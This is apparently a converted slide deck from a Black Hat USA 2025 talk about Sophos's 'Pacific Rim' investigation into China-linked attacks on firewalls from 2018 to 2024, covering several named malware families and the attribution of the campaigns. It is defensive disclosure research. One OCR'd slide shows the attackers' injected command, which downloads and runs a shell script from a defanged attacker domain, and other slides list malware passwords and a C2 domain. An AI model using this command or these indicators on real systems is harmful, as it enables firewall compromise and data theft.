---
title: "Firewalls Under Fire China's 5+ Year Campaign to Penetrate Perimeter Network Defenses"
speakers: ["Andrew Brandt"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Andrew Brandt_Firewalls Under Fire China's 5+ Year Campaign to Penetrate Perimeter Network Defenses.pdf"
pages: 65
sha256: "2c3e2600240c627740e776a11655236dc7d02d959ba099cc0ac38d24722c9544"
text_chars: 26676
ocr_pages: 9
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:49:57Z"
---
# Firewalls Under Fire China's 5+ Year Campaign to Penetrate Perimeter Network Defenses

**Speakers:** Andrew Brandt  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Andrew Brandt_Firewalls Under Fire China's 5+ Year Campaign to Penetrate Perimeter Network Defenses.pdf` (65 pages)


## Slide 1

Firewalls Under Fire China’s ongoing campaign to compromise network protection devices worldwide

Andrew Brandt

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
‘black hat
FINGS
AUGUST be 2025
MANDALAY BAY / LAS VEGAS
Firewalls Under Fire
China’s ongoing campaign to compromise
network protection devices worldwide
Andrew Brandt
#BHUSA @BlackHatEvents
```

## Slide 2

# About me

- •Threat research at Webroot, Solera Networks, Blue Coat, Symantec, Sophos, Netcraft

- •Malware and network forensics, retrospective attack analysis

•“Investigative cyberattack journalism”

- •Elect More Hackers

- •World Cyber Health/Malware Village

- •Malware Village

•Media Archaeology Lab (CU Boulder)

#BHUSA @BlackHatEvents

## Slide 3

# Context

•Timespan for these events is from 2018 – 2024(ish)

•Sophos X-Ops sits at the intersection of (and now encompasses) several teams of analysts and researchers

•Research conducted by many of my former peers and colleagues, compiled by me & X- Ops

•Too many technical details to cover in 40 minutes

#BHUSA @BlackHatEvents

## Slide 4

# Dramatis Personae

- •Firewall vendors

   - •Other security companies

- •Chengdu, Sichuan, China

   - •Individual threat actors

   - •Companies

   - •A university

- •Firewalls and other edge devices

   - •Bare metal and virtual devices

#BHUSA @BlackHatEvents

## Slide 5

# Attack phases/epochs

- •Initial attack & recon: 2018-2019

- •Mass-attack phase: 2020-2021

- •Targeted attacks and recurring use of old exploits with new payloads: 20212024

- •Research published October 2024

- •Attacks ongoing

**Source: FBI**

#BHUSA @BlackHatEvents

## Slide 6

# Public disclosure

- •Cloud Snooper (2020)

- •“Asnarök” public attacks (2020)

- •Bookmark feature buffer overflow (2021)

- •Personal Panda (2022)

- •Covert Channels (2023)

- •“Pacific Rim” encompassing these plus previously undisclosed campaigns (2024)

**Source: Sophos**

#BHUSA @BlackHatEvents

## Slide 7

# Why “Pacific Rim?”

•Cloud Snooper (2020) aka Arizona

- •“Asnarök” (2020) aka Mexico

- •Bookmark feature buffer overflow (2021) aka Baja

- •Personal Panda (2022) aka Alaska

- •CVE-2022-3236 (2022) aka Yukon

- •Covert Channels (2023) “Alaska part 2”

#BHUSA @BlackHatEvents

## Slide 8

# Phase zero: The break-in

**Source: Sophos / Sergei Shevchenko**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Phase zero: The break-in
at
ant
=
es
‘wy
Lr
we
ay
+
x
Any
WN
Ws
°®
7]
et
ee
aoe a
cA
" HTTP Response }
#BHUSA @BlackHatEvents
Source: Sophos / Sergei Shevchenko
```

## Slide 9

# The first domino

- •NUC in Cyberoam office

- •The leaderboard is scanning the network •Investigation discovers tooling, malware on NUC ("Next Unit of Computing")

- •Discovery of a then-novel technique to pivot to cloud assets

- •Overly permissive AWS Identity & Access Management (IAM) configuration

#BHUSA @BlackHatEvents

## Slide 10

# The first domino

- •NUC in Cyberoam office

- •The leaderboard is scanning the network •Investigation discovers tooling, malware on NUC ("Next Unit of Computing")

- •Discovery of a then-novel technique to pivot to cloud assets

- •Overly permissive AWS Identity & Access Management (IAM) configuration

#BHUSA @BlackHatEvents

## Slide 11

# Stealthy, cloud-based rootkit

- •Several malicious components installed on AWS server

- •Drops /tmp/snoopy

- •Deletes file, remains memory resident

**Source: Charles Schulz**

- •“Snoopy” monitors all inbound network packets for ones with specific source port numbers

- •The port number is the command

#BHUSA @BlackHatEvents

## Slide 12

# Hidden in plain sight

- •Exfil disguised as normal outbound traffic

- •Contains some broken code that wouldn't ever be able to run

- •Alternate version drops Gh0st RAT named after a well-known FTP server daemon

- •Investigation also found eleven separate malware, including Onderon, custom backdoors that delete logs, and…a Gh0st RAT Windows DLL payload

#BHUSA @BlackHatEvents

## Slide 13

# Quirky but rough around the edges

- •Cloud Snooper helpfully outputs debug messages…in Chinese

- •Payload decryption key is YaHo0@ •The C2 encryption key is based on hashing the phrase " _replace with your password_ "

- •C2 domains reference the ccTLD of the country of Nepal, .np and…

#BHUSA @BlackHatEvents

## Slide 14

# Quirky but rough around the edges

- •Cloud Snooper helpfully outputs debug messages…in Chinese

- •Payload decryption key is YaHo0@ •The C2 encryption key is based on hashing the phrase " _replace with your password_ "

•C2 domains reference the ccTLD of the country of Nepal, .np and… `load.CollegeSmooch.com`

#BHUSA @BlackHatEvents

## Slide 15

# 18 months later…

- •Sophos kept Cloud Snooper under wraps until early 2020.

- •Sergei Shevchenko and Tim Easton wrote up a report, but didn’t disclose to me that it described an attack against the company.

- •The analysis published on February 25, 2020 – just before the pandemic lockdowns

### **Source: Sophos**

#BHUSA @BlackHatEvents

## Slide 16

# The mass attacks era

**Source: Sophos**

#BHUSA @BlackHatEvents

## Slide 17

# The mass attacks era

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Central management
~~
ron @) Manage your firewall using
©@) Sophos Firewall Manager (SFM)
Firewall Manager IP address/domain *
https://sophosfirewallupdate.c |
l|cd /tmp/ && wget hxxps://sophosfirewallupdate[.]com/sp/Install.sh -O /tmp/x.sh && chmod 777 /tmp/x.sh && sh
/tmp/x.sh]|
#BHUSA @BlackHatEvents
```

## Slide 18

# Asnarök begins

•Day 0: Bug bounty awarded for CVE-2020-12271

- •Day 1 exploit. Thousands of firewalls affected

- •Day 2 hotfix patch

- •Day 11: new telemetry added

- •A few weeks later, a retro-hunt finds Patient Zero

**Source: Sophos**

#BHUSA @BlackHatEvents

## Slide 19

# Breaking and entering…the firewall

- •Uses domains registered just prior to the attack, with the vendor name in them

- •SQL injection leads to a Bash script

- •Modifies internal functions of firewall and establishes persistence

**Source:  Sophos / Dmitry Samosseiko**

- •Steals firewall config and locally saved user account data “2own” the firewall

- •Encrypts the data into a file named **info.xg** encrypted with the password GUCCI

#BHUSA @BlackHatEvents

## Slide 20

# Burdened with glorious purpose?

•The malware featured a so-called _dead man’s switch_

- •If a zero-byte file gets deleted, it triggers an alternative payload

- •Delivered from a domain named after an event from Norse mythology (or maybe just a Marvel movie)

- •After Sophos released hotfixes, the “dead man’s switch” domain went live

**Source: Marvel/Comic Con | Sophos**

#BHUSA @BlackHatEvents

## Slide 21

# Ragnarok threatened

- •When triggered, it tried EternalBlue and DoublePulsar exploits to spread Ragnarok ransomware to Windows computers on the LAN side of the firewall

- Payload was named “hotfix”

- •Same ransomware deployed via vulnerable Citrix ADC servers in January 2020

**Source: Sophos** •Excluded computers with Chinese localization settings

#BHUSA @BlackHatEvents

## Slide 22

# Ragnarok averted

- Exploits only work on Windows 7

- • Ransomware was easily blocked by endpoint software

**Source: Marvel**

#BHUSA @BlackHatEvents

**Source: Sophos**

## Slide 23

# Ragnarok averted

• Exploits only work on Windows 7 • Ransomware was easily blocked by endpoint software

**Source: Marvel**

**Source: C3 Entertainment** #BHUSA @BlackHatEvents

## Slide 24

# Sinkhole, telemetry revelations

- •11 days after the attack, Dutch LE seizes the servers hosting “ragnarokfromasgard” and hands the domain off to Sophos to sinkhole

- •Many of the devices contacting the domain appear to be a variety of consumer and SOHO routers

- •Security Ops and engineering teams introduce new telemetry capabilities to XG firewalls…and “the implant”

**Source: Generative AI**

#BHUSA @BlackHatEvents

## Slide 25

# The implant & the hotfix

- •Sophos created a tool they call “the implant” or “the kernel implant”

- •Capable of retrieving logs and files from XG firewalls for advanced analysis

- •Does not show up in process lists on firewalls

- •Only deployed against firewalls who have a history of suspicious activity

**Source: Generative AI**

#BHUSA @BlackHatEvents

## Slide 26

# Using the kernel implant

- •Security Operations deploys the implant to a small number of devices

- •Small-scale intrusions at targeted locations with unique payloads

- •They also see attackers testing new exploits they’re developing

- •Sophos uses the implant to retrieve malware, then hotfixes the vulns before they get widely exploited

**Image source: thespruce.com**

#BHUSA @BlackHatEvents

## Slide 27

# Summer of cat-and-mouse

- •56 days after Asnarök, attackers use CVE2020-15069 to hit thousands of firewalls at once, again, with webshells

- •The new telemetry capabilities mean Security Operations can dig for a patient zero device, again, and find it

- •This new bug was being tested in early April, before Asnarök had begun

- •Attackers sabotage the hotfix mechanism itself for the first time

**Source: Sophos**

#BHUSA @BlackHatEvents

## Slide 28

# How to find an exploit maker

- •Telemetry hunts find a cluster of XG firewalls geolocated in the city of Chengdu with fishy registration and nonstandard setups

- •They have almost nothing on the LAN side, and the firmware versions jump forward and back, like the device was being reflashed

- •Many of the devices are registered to an email that starts with “GBigMao”

#BHUSA @BlackHatEvents

**Image source: The Mirror (UK)**

## Slide 29

# Another character joins the fray

- •More weird behavior originates from firewalls registered in Chengdu

- •One of the devices previously was used by a lecturer at the University of Electronic Science and Technology of China (UESTC) in Chengdu

**Image source:  CBS / Paramount**

#BHUSA @BlackHatEvents

## Slide 30

# Another character joins the fray

- •The firewalls seem to leap between IP addresses in farflung locations, indicating the intermittent use of a VPN

**Image source:  CBS / Paramount**

#BHUSA @BlackHatEvents

## Slide 31

# Another character joins the fray

- •The firewalls seem to leap between IP addresses in farflung locations, indicating the intermittent use of a VPN

- •Registered to "TStark"

**Image source:  CBS / Paramount | Marvel**

#BHUSA @BlackHatEvents

## Slide 32

# Another character joins the fray

- •The firewalls seem to leap between IP addresses in farflung locations, indicating the intermittent use of a VPN

- •Registered to "TStark"

**Image source:  CBS / Paramount | Marvel | big sigh**

#BHUSA @BlackHatEvents

## Slide 33

# The Chengdu-APT41 nexus

- •One of the kernel implants deployed on a TStark-registered device finds a copy of the Winnti rootkit on it

- •Sophos quietly patches all firewalls to immunize them to this type of malware, and it isn’t seen again

**Image source: LAC Watch**

#BHUSA @BlackHatEvents

## Slide 34

# The Chengdu-APT41 nexus

- •One of the kernel implants deployed on a TStark-registered device finds a copy of the Winnti rootkit on it

- •Sophos quietly patches all firewalls to immunize them to this type of malware, and it isn’t seen again

- •A week later, the implant retrieves malware for Apple OS X and iOS from another TStark-registered firewall

**Image source: LAC Watch**

**Image source:  Malmons World**

#BHUSA @BlackHatEvents

## Slide 35

# Apple malware is Insomnia implant

- •10 days after Sophos finds the iOS & OS X malware on TStark’s firewall, Volexity publishes a report on Evil Eye

- •Volexity’s report focuses on exploits against iOS phones targeting Uyghur support organizations

**Image source: Volexity**

- •Sophos and Volexity determine the samples are related, targeting Tibetan exile support organizations

#BHUSA @BlackHatEvents

## Slide 36

# A last hurrah: Cyberoam attacks

•As 2020 comes to a close, the last mass-attack against Sophos products hits Cyberoam devices, which are nearing end-of-life

- •CVE-2020-29574 is abused to create “cybersupport” accounts on all devices

- •8 months later, in July 2021, France’s ANSSI attributes the attacks to APT-31

### **Image source:  ANSSI France**

#BHUSA @BlackHatEvents

## Slide 37

# The targeted attacks era

Image source:  Generative AI

#BHUSA @BlackHatEvents

## Slide 38

# Another 0day, another double dip

•On March 21, 2022, Sophos receives a bug bounty submission a day before an exploit involving the bug is observed in the wild

   - •CVE-2022-1040

- •The researcher, who did not wish to be credited, claimed they were based in Japan, but the IP of the device they were using geo-located to China

**Image source:  Depeche Mode**

#BHUSA @BlackHatEvents

## Slide 39

# Personal Panda victimology

**Image source: Chatham House**

- •The pair of bugs that combine to make the CVE-2022-1040 exploit bypass firewall authentication, then exploit OpenSSL (CVE-2022-1292) for root access

- •Most of the targeted devices appear to be located in sensitive positions in countries targeted by China’s “Belt and Road Initiative” around Asia

- •Targets also included the same Tibetan support group targeted in 2020

#BHUSA @BlackHatEvents

## Slide 40

# Personal Panda tooling weirdness

- •One of the weirdest things was to find an embedded CA Root certificate in the malware left on the firewall

- •Why would the threat actor leave a cert forged to look like it was signed by Fortinet on a Sophos firewall?

**Image source:  Sophos**

#BHUSA @BlackHatEvents

## Slide 41

# Personal Panda tooling weirdness

- •One of the weirdest things was to find an embedded CA Root certificate in the malware left on the firewall

- •Why would the threat actor leave a cert forged to look like it was signed by Fortinet on a Sophos firewall?

**Image source:  "The Naked Gun"** #BHUSA @BlackHatEvents

**Image source:  Sophos**

## Slide 42

# A wild Pygmy Goat appears

- •A bespoke malware, libsophos.so

•Deployed just to two firewalls protecting a high-level government office in an Asian country

- •The malware employs some of the same network traffic concealment techniques as Cloud Snooper used

- •UK’s NCSC names it “Pygmy Goat”

**Image source:  City of Idaho Falls, ID**

#BHUSA @BlackHatEvents

## Slide 43

# Pygmy Goat’s Iron Man connection

- •While searching for more Pygmy Goat samples, Sophos finds the earliest example on two firewalls registered to the TStark identity who previously toyed with Winnti and Evil Eye/Insomnia payloads

- •TStark had tested both libsophos.so and an earlier version named libgoat.so on devices, including an identical version found on the compromised firewalls

**Image source: Marvel**

#BHUSA @BlackHatEvents

## Slide 44

# Pygmy Goat’s Iron Man connection

- •While searching for more Pygmy Goat samples, Sophos finds the earliest example on two firewalls registered to the TStark identity who previously toyed with Winnti and Evil Eye/Insomnia payloads

- •TStark had tested both libsophos.so and an earlier version named libgoat.so on devices, including an identical version found on the compromised firewalls

**Image source: Marvel + City of Idaho Falls, ID**

#BHUSA @BlackHatEvents

## Slide 45

DriftingCloud delivers a Sliver •Volexity shares IOCs from an XG that was -1040ed, used to MITM web traffic and steal creds •The C2 IP address leads to another, single firewall running a unique malware sample Sophos determines is a component of the Sliver adversary emulation framework

**Image source: Volexity**

#BHUSA @BlackHatEvents

## Slide 46

# UEFI bootkit discovered

- •In August 2022, hunting discovered a firewall (already under surveillance) running suspicious commands

- •Using the kernel implant, analysts retrieved a file from the firewall. It turned out to be a development version of a UEFI bootkit called VectorEDK

## **Kaspersky: MosaicRegressor (VectorEDK)**

#BHUSA @BlackHatEvents

## Slide 47

# Covert Channels

•Sophos assisted a nuclear regulatory agency and a supplier in one of the targeted countries, starting in summer 2022

- •Discovery of CVE-2022-3236 led to malware

- •Payloads: custom Golang Trojan, Fast Reverse Proxy (FRP) & …

**Image source: The Telegraph (UK)**

#BHUSA @BlackHatEvents

## Slide 48

# Covert Channels attacks begin

- •By September 2022, attackers become proficient with Trojanized JARs

   - •supplements existing system code

- •CVE-2022-3236 affects an outdated, EOL firmware version

- •Early targets have similar victimology to the targets of the Personal Panda attacks

## **Image source: Sophos**

#BHUSA @BlackHatEvents

## Slide 49

# A JAR full of badness

•One JAR malware, called Termite, sniffs creds from the web admin interface, then performs DCSync attacks against LAN devices using those credentials, & deletes logs

- •One country in particular was targeted with attacks against firewalls protecting its water and power system, as well as military and state security entities

**Image source: New Girl (Elizabeth Meriwether Pictures and 20th Century Fox Television)**

#BHUSA @BlackHatEvents

## Slide 50

# Spring 2023 oddball payloads

**Image source:  MicroSocks Github**

- •From March through April 2023, Sophos investigated a cluster of infected firewalls at a government-owned tech supplier

- •Malware included a port mapper (LCS); a MicroSocks instance with a password of “Pa55W0rd,” a bespoke ELF backdoor to sniff credentials entered into the firewall, and a custom Go-based RAT

**Image source:  Buttons the rat**

#BHUSA @BlackHatEvents

**Image source:  dvm360 on YouTube**

## Slide 51

# A hook for persistence

- •One firewall discovered in May 2023 was running an unremarkable remote shell that had pioneered a previously unknown persistence method, using plthook

- •The hook writes a backdoor into a temp partition that persists when the firewall reboots, for storing updates.

- •One of the firewalls believed to be run by the exploit developer has the same copy and firmware as the infected XG

**Image source: PLTHook documentation**

#BHUSA @BlackHatEvents

## Slide 52

# Where do we go from here?

Image source: Mutant Enemy / Buffy The Vampire Slayer "Once More, With Feeling"

#BHUSA @BlackHatEvents

## Slide 53

#BHUSA @BlackHatEvents

**Image source: FBI**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ SEEKING
/ INFORMATION
EDGE DEVICE INTRUSIONS
Cyber Intrusions into Companies and Government Entities
April 2020 to Present
DETAILS
The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
belonging to companies and government entities.
As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
Image source: FBI
#BHUSA @BlackHatEvents
```

## Slide 54

#BHUSA @BlackHatEvents

**Image source: FBI**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ SEEKING
/ INFORMATION
EDGE DEVICE INTRUSIONS
Cyber Intrusions into Companies and Government Entities
April 2020 to Present
As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
DETAILS
The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
belonging to companies and government entities.
As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
Image source: FBI
#BHUSA @BlackHatEvents
```

## Slide 55

#BHUSA @BlackHatEvents

**Image source: FBI**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ SEEKING
/ INFORMATION
EDGE DEVICE INTRUSIONS
Cyber Intrusions into Companies and Government Entities
April 2020 to Present
As described by Sophos Ltd.|in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
DETAILS
The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
belonging to companies and government entities.
As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
Image source: FBI
#BHUSA @BlackHatEvents
```

## Slide 56

#BHUSA @BlackHatEvents

**Image source: FBI**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ SEEKING
/ INFORMATION
EDGE DEVICE INTRUSIONS
Cyber Intrusions into Companies and Government Entities
April 2020 to Present
As described by Sophos Ltd.|in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
(Cve-2020-12271
malware exploiting the vulnerability |\CVE-2020-12271\as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
DETAILS
The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
belonging to companies and government entities.
As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
Image source: FBI
#BHUSA @BlackHatEvents
```

## Slide 57

#BHUSA @BlackHatEvents

**Image source: FBI**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ SEEKING
/ INFORMATION
EDGE DEVICE INTRUSIONS
Cyber Intrusions into Companies and Government Entities
April 2020 to Present
EEN
As described by Sophos Ltd.|in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
(Cve-2020-12271
malware exploiting the vulnerability |\CVE-2020-12271\as part of
a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding} the identities of the individuals responsible for these cyber intrusions.
DETAILS
The Federal Bureau of Investigation (FBI) is asking the public for assistance in an investigation involving the compromise of edge devices and computer networks
belonging to companies and government entities.
As described by Sophos Ltd. in a recently released cyber security report, on April 22, 2020, an Advanced Persistent Threat group allegedly created and deployed
malware exploiting the vulnerability CVE-2020-12271 as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding the identities of the individuals responsible for these cyber intrusions.
Image source: FBI
#BHUSA @BlackHatEvents
```

## Slide 58

# Scope creep

- •Including the Sophos vulnerabilities, the report lists 206 other serious vulnerabilities that affected firewalls up to a year ago.

- •25 other vendors are represented, including Barracuda, Check Point, Cisco, Citrix, Fortinet, Ivanti, Juniper, Palo Alto, and Sonicwall

- •132 have a CVSS of >8

- •92 are =>9.8

- •Operational Relay Beacons

#BHUSA @BlackHatEvents

**Image source: Robert Tinney / Byte Manazine, December 1977**

## Slide 59

# Just in the past MONTH(ish)

- •Cisco 3x exploited critical vulns in Identity Services Engine (June 25)

- •Fortinet "FortiWeb" exploit (July 18)

- •Sophos – 5 critical CVEs patched (July 21)

- •Microsoft "ToolShell" Sharepoint attacks (July 22)

- •SonicWall 0day – Akira (Aug 5)

**Image source: Infosecurity Magazine**

#BHUSA @BlackHatEvents

## Slide 60

# Is CNVD ≥ CVE?

- •2022 Labscon talk by Kristin Del Rosso

- •China’s vulnerability discovery process is industrialized – and secretive

- •Maintainers work to prevent USbased researchers accessing it

- •It seems to have…more

**Image source: SentinelOne/LabsCon**

#BHUSA @BlackHatEvents

## Slide 61

# Before breaking bad

- •GBigMao used to want to report vulnerabilities to vendors…not to get paid, but to “fix these quickly”

**Image source: OpenWall listserv archive**

#BHUSA @BlackHatEvents

## Slide 62

# Indictment: Guan “GBigMao” Tianfeng

**Image source: FBI Most Wanted List**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Most Wanted
Ten Most Wanted Fugitives Fugitives | Terrorism | Kidnappings/Missing Persons | Parental Kidnay
Crimes Against Children | Murder | Additional Violent Crimes | Cyber | White Collar Crimes | Cou!
GUAN TIANFENG
Conspiracy to Commit Computer Fraud; Conspiracy to Commit Wire Fraud
Email
Aliases:
gxiaomao
Aliases: Image source: FBI Most Wanted List
gbigmao, gxiaomao
#BHUSA @BlackHatEvents
```

## Slide 63

# Nobody is an exclusive target

- •All software has bugs

- •All firewalls are used to protect important things

- •All firewalls are currently under threat by China’s hackers

- •Diplomacy and the rule of law are under attack everywhere

- •Where do we turn?

**Image source: Charles Schulz**

#BHUSA @BlackHatEvents

## Slide 64

# Infosec ISAC

**Image source: United Nations general assembly**

- •All 26 vendors represented on the Appendix III list need to be in regular contact

- •As well as every other company that makes a device that faces the public internet

- •Whether it’s through industry sharing orgs like CTA, or something else

#BHUSA @BlackHatEvents

## Slide 65

# Acknowledgments

Sophos:

- Tim Easton, Craig Jones, Sabrina Karim, Joe Levy, Ross McKerchar, Elison Niven, Darshan Raghwani, Brijesh Rajput, Tom Sage, Dmitry Samosseiko, Sergei Shevchenko, Emily Taylor, many others

Volexity:

• Steven Adair, Tom Lancaster Recorded Future Microsoft CISA, FBI, NCSC-UK, NCSC-NL, ANSSI Many others

Get in touch:

andrew.brandt@worldcyber.health fuf@electmorehackers.com @threatresearch@infosec.exchange

QUESTIONS: PacificRim@Sophos.com

**Image source: Unknown retro comic book**

#BHUSA @BlackHatEvents
